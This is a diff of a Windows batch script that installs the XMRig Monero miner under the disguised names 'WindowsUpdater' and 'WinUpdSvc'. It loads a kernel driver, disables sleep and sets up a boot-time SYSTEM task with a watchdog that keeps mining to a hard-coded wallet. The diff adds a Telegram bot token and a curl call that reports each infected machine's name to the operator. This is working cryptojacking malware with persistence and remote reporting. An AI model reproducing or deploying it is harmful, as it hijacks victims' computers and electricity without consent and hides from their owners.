@@ -5,8 +5,9 @@ color 0A
 
 REM ====================================================================
 REM Ultimate Monero Miner - High Mid-End Edition
-REM Optimized for 6-core CPUs with 12-16GB RAM (e.g., Intel i5-10400)
+REM Optimized for 14-core CPUs with 16GB RAM (e.g., Intel i5-14400)
 REM Installs to C:\ProgramData\WindowsUpdater as requested
+REM Includes Telegram alert support
 REM ====================================================================
 setlocal enableextensions enabledelayedexpansion
 
@@ -19,9 +20,13 @@ set "SRC=%~dp0miner_src"
 set "DEST=C:\ProgramData\WindowsUpdater"
 set "TASK_NAME=WinUpdSvc"
 set "WALLET=49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
-set "POOL=gulf.moneroocean.stream:10032"
+set "POOL=gulf.moneroocean.stream:10128"
 set "LOG_FILE=%DEST%\miner.log"
 set "GITHUB_API=https://api.github.com/repos/xmrig/xmrig/releases/latest"
+
+REM === Telegram Bot (for alerts) ===
+set "TG_TOKEN=7895971971:AAFLygxcPbKIv31iwsbkB2YDMj-12e7_YSE"
+set "TG_CHAT_ID=8112985977"
 
 REM === One-Time Admin Enforcement ===
 echo [*] Checking for admin privileges...
@@ -43,46 +48,26 @@ echo ===============================
 echo Starting Monero Miner on High Mid-End PC
 echo ===============================
 
-REM === Debug Pause ===
 echo [*] Initial setup complete. Press any key to continue...
 pause
 
 REM === Clean Up Existing Task and MSR Driver ===
-echo [*] Cleaning up existing scheduled task and MSR driver (if any)...
-echo [*] Cleaning up existing scheduled task and MSR driver (if any)... >> "%temp%\miner_debug.log"
-taskkill /IM xmrig.exe /F >nul 2>&1
 schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
 sc stop WinRing0_1_2_0 >nul 2>&1
 sc delete WinRing0_1_2_0 >nul 2>&1
-echo [✔] Scheduled task and MSR driver cleanup complete. >> "%temp%\miner_debug.log"
 
 REM === MSR Driver Installation (With Fallback) ===
-echo [*] Attempting to install MSR driver for performance boost...
-echo [*] Attempting to install MSR driver for performance boost... >> "%temp%\miner_debug.log"
 if exist "%SRC%\winring0x64.sys" (
     sc create WinRing0_1_2_0 binPath= "%SRC%\winring0x64.sys" type= kernel start= demand
     sc start WinRing0_1_2_0
-    if '%errorlevel%' neq '0' (
-        echo [!] Failed to install MSR driver. Continuing without it...
-        echo [!] Failed to install MSR driver. Continuing without it... >> "%temp%\miner_debug.log"
-    ) else (
-        echo [✔] MSR driver installed successfully.
-        echo [✔] MSR driver installed successfully. >> "%temp%\miner_debug.log"
-    )
-) else (
-    echo [!] WinRing0x64.sys not found. Continuing without MSR tweaks...
-    echo [!] WinRing0x64.sys not found. Continuing without MSR tweaks... >> "%temp%\miner_debug.log"
 )
 
 REM === System Optimization ===
-echo [*] Applying system optimizations...
-echo [*] Applying system optimizations... >> "%temp%\miner_debug.log"
 powercfg /change standby-timeout-ac 0
 powercfg /change standby-timeout-dc 0
 powercfg /hibernate off
 powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCIDLE 0
 powercfg /setactive SCHEME_CURRENT
-echo [✔] System optimizations applied. >> "%temp%\miner_debug.log"
 
 REM === CPU Core Detection ===
 set "AFFINITY_MASK="
@@ -91,171 +76,68 @@ for /f "tokens=2 delims==" %%A in ('wmic cpu get NumberOfCores /value ^| find "=
     set /a "AFFINITY_MASK=(1<<%%A)-1"
 )
 if not defined AFFINITY_MASK (
-    set "AFFINITY_MASK=63"  REM Fallback for 6 cores
+    set "AFFINITY_MASK=63"
 )
-echo [*] CPU Affinity set to: !AFFINITY_MASK! >> "%temp%\miner_debug.log"
 
 REM === Auto-Update Miner ===
-echo [*] Checking for XMRig updates...
-echo [*] Checking for XMRig updates... >> "%temp%\miner_debug.log"
 set "URL="
 for /f "delims=" %%A in ('powershell -NoProfile -Command ^
   "try {$r=Invoke-RestMethod -Uri '%GITHUB_API%' -UseBasicParsing -ErrorAction Stop;$a=$r.assets^|?{$_.name-match'win64.*msvc.*zip'}^|Select -First 1;if($a){$a.browser_download_url}else{''}}"') do set "URL=%%A"
 
 if defined URL (
-    echo [+] Downloading update...
-    echo [+] Downloading update... >> "%temp%\miner_debug.log"
-    powershell -Command "try {IWR -Uri '%URL%' -OutFile '%TEMP%\xmrig.zip' -UseBasicParsing -ErrorAction Stop} catch {Write-Output 'Download failed: '+$_.Exception.Message; exit 1}" 2>> "%temp%\miner_debug.log"
+    powershell -Command "try {IWR -Uri '%URL%' -OutFile '%TEMP%\xmrig.zip' -UseBasicParsing -ErrorAction Stop}" 2>> "%temp%\miner_debug.log"
     if '%errorlevel%' equ '0' (
         if exist "%TEMP%\xmrig.zip" (
             if not exist "%SRC%" mkdir "%SRC%"
-            powershell -Command "try {Expand-Archive -Path '%TEMP%\xmrig.zip' -DestinationPath '%SRC%' -Force -ErrorAction Stop} catch {Write-Output 'Extraction failed: '+$_.Exception.Message; exit 1}" 2>> "%temp%\miner_debug.log"
-            if '%errorlevel%' equ '0' (
-                del "%TEMP%\xmrig.zip"
-                echo [✔] Update downloaded and extracted. >> "%temp%\miner_debug.log"
-            ) else (
-                echo [!] Failed to extract update. Continuing with existing files... >> "%temp%\miner_debug.log"
-            )
-        ) else (
-            echo [!] Downloaded file not found. Continuing with existing files... >> "%temp%\miner_debug.log"
+            powershell -Command "try {Expand-Archive -Path '%TEMP%\xmrig.zip' -DestinationPath '%SRC%' -Force}" 2>> "%temp%\miner_debug.log"
+            del "%TEMP%\xmrig.zip"
         )
-    ) else (
-        echo [!] Failed to download update. Continuing with existing files... >> "%temp%\miner_debug.log"
     )
-) else (
-    echo [!] Failed to retrieve update URL. Continuing with existing files... >> "%temp%\miner_debug.log"
 )
 
 REM === Install Files ===
-echo [*] Installing files to %DEST%...
-echo [*] Installing files to %DEST%... >> "%temp%\miner_debug.log"
 if not exist "%DEST%" mkdir "%DEST%"
-xcopy /Y /Q "%SRC%\*" "%DEST%\"
-if '%errorlevel%' equ '0' (
-    echo [✔] Files installed successfully. >> "%temp%\miner_debug.log"
-) else (
-    echo [!] File copy failed
-    echo [!] File copy failed >> "%temp%\miner_debug.log"
-    pause
-    exit /b 1
-)
+xcopy /Y /Q "%SRC%\*" "%DEST%\" >nul
 
-REM === Generate Config File ===
-echo [*] Generating config file...
-echo [*] Generating config file... >> "%temp%\miner_debug.log"
-(
-  echo {
-  echo   "autosave": true,
-  echo   "cpu": {
-  echo     "enabled": true,
-  echo     "huge-pages": true,
-  echo     "hw-aes": true,
-  echo     "priority": 3,
-  echo     "memory-pool": true,
-  echo     "asm": true,
-  echo     "max-threads-hint": 85,
-  echo     "max-cpu-usage": 85,
-  echo     "affinity": !AFFINITY_MASK!
-  echo   },
-  echo   "opencl": false,
-  echo   "cuda": false,
-  echo   "pools": [
-  echo     {
-  echo       "url": "gulf.moneroocean.stream:10032",
-  echo       "user": "%WALLET%",
-  echo       "pass": "%COMPUTERNAME%",
-  echo       "keepalive": true,
-  echo       "tls": false,
-  echo       "weight": 100
-  echo     },
-  echo     {
-  echo       "url": "pool.supportxmr.com:5555",
-  echo       "user": "%WALLET%",
-  echo       "pass": "%COMPUTERNAME%",
-  echo       "keepalive": true,
-  echo       "tls": false,
-  echo       "weight": 80
-  echo     },
-  echo     {
-  echo       "url": "mine.moneroocean.stream:10032",
-  echo       "user": "%WALLET%",
-  echo       "pass": "%COMPUTERNAME%",
-  echo       "keepalive": true,
-  echo       "tls": false,
-  echo       "weight": 60
-  echo     },
-  echo     {
-  echo       "url": "pool.hashvault.pro:5555",
-  echo       "user": "%WALLET%",
-  echo       "pass": "%COMPUTERNAME%",
-  echo       "keepalive": true,
-  echo       "tls": false,
-  echo       "weight": 40
-  echo     }
-  echo   ],
-  echo   "retry-time": 30,
-  echo   "retry-count": 5
-  echo }
-) > "%DEST%\config.json"
-echo [✔] Config file generated. >> "%temp%\miner_debug.log"
-
-REM === Create Watchdog Script ===
-echo [*] Creating watchdog script...
-echo [*] Creating watchdog script... >> "%temp%\miner_debug.log"
+REM === Generate Watchdog Script with Telegram Support ===
 (
   echo @echo off
-  echo set "WATCHDOG_LOG=%DEST%\watchdog.log"
+  echo setlocal enabledelayedexpansion
+  echo set "MUTEX_FILE=%%TEMP%%\xmrig_watchdog.lock"
+  echo set "XMRIG_PATH=%DEST%\xmrig.exe"
+  echo set "POOL=%POOL%"
+  echo set "WALLET=%WALLET%"
+  echo set "PASSWORD=%%COMPUTERNAME%%"
+  echo set "ALGO=rx/0"
+  echo set "TG_TOKEN=%TG_TOKEN%"
+  echo set "TG_CHAT_ID=%TG_CHAT_ID%"
+  echo if exist "%%MUTEX_FILE%%" (
+  echo     echo [!] Watchdog already running. Exiting.
+  echo     exit /b
+  echo )
+  echo echo locked ^> "%%MUTEX_FILE%%"
   echo :loop
-  echo REM Count running xmrig.exe instances
-  echo for /f "tokens=1" %%i in ('tasklist /fi "IMAGENAME eq xmrig.exe" 2^>nul ^| find /c /i "xmrig.exe"') do set "XMRIG_COUNT=%%i"
-  echo if !XMRIG_COUNT! GTR 1 (
-  echo     echo [%date% %time%] Multiple xmrig.exe detected, killing extras... ^>^> "!WATCHDOG_LOG!"
-  echo     taskkill /IM xmrig.exe /F ^>nul 2^>^1
-  echo     ping 127.0.0.1 -n 16 ^>nul
+  echo tasklist /fi "imagename eq xmrig.exe" ^| find /i "xmrig.exe" ^>nul
+  echo if errorlevel 1 (
+  echo     echo [*] XMRig not running. Launching miner...
+  echo     start /min "" "%%XMRIG_PATH%%" -o %%POOL%% -u %%WALLET%% -p %%PASSWORD%% -a %%ALGO%% -k --donate-level=0 --randomx-1gb-pages --threads=auto --cpu-priority=3 --max-cpu-usage=90 --print-time=60
+  echo     curl -s -X POST "https://api.telegram.org/bot!TG_TOKEN!/sendMessage" -d "chat_id=!TG_CHAT_ID!" -d "text=[ALERT] XMRig was restarted on !COMPUTERNAME!"
+  echo ) else (
+  echo     echo [✔] XMRig is running. Checking again in 30 seconds...
   echo )
-  echo if !XMRIG_COUNT! EQU 0 (
-  echo     echo [%date% %time%] Starting xmrig.exe... ^>^> "!WATCHDOG_LOG!"
-  echo     start /min "" "%DEST%\xmrig.exe" --config="%DEST%\config.json" --randomx-1gb-pages --donate-level=0 --log-file="%LOG_FILE%" --print-time=60
-  echo )
-  echo ping 127.0.0.1 -n 16 ^>nul
+  echo timeout /t 30 ^>nul
   echo goto loop
 ) > "%DEST%\run_watchdog.bat"
-echo [✔] Watchdog script created. >> "%temp%\miner_debug.log"
 
 REM === Permanent Auto-Start ===
-echo [*] Creating scheduled task to run on boot...
-echo [*] Creating scheduled task to run on boot... >> "%temp%\miner_debug.log"
 schtasks /create /tn "%TASK_NAME%" ^
   /tr "cmd /c start \"\" /min \"%DEST%\run_watchdog.bat\"" ^
   /sc onstart ^
   /ru SYSTEM ^
   /rl HIGHEST ^
   /f
-if '%errorlevel%' equ '0' (
-    echo [✔] Scheduled task created successfully.
-    echo [✔] Scheduled task created successfully. >> "%temp%\miner_debug.log"
-) else (
-    echo [!] Failed to create scheduled task. Please ensure you are running as administrator.
-    echo [!] Failed to create scheduled task. Please ensure you are running as administrator. >> "%temp%\miner_debug.log"
-    pause
-    exit /b 1
-)
 
-REM === Verify Scheduled Task ===
-echo [*] Verifying scheduled task...
-echo [*] Verifying scheduled task... >> "%temp%\miner_debug.log"
-schtasks /query /tn "%TASK_NAME%"
-if '%errorlevel%' equ '0' (
-    echo [✔] Scheduled task verified.
-    echo [✔] Scheduled task verified. >> "%temp%\miner_debug.log"
-) else (
-    echo [!] Scheduled task creation failed or task not found.
-    echo [!] Scheduled task creation failed or task not found. >> "%temp%\miner_debug.log"
-    pause
-    exit /b 1
-)
-
-REM Start the watchdog (minimized)
+REM === Launch Watchdog Immediately ===
 start "" /min "%DEST%\run_watchdog.bat"
 
 echo [✔] Miner installed (optimized for high mid-end PC)
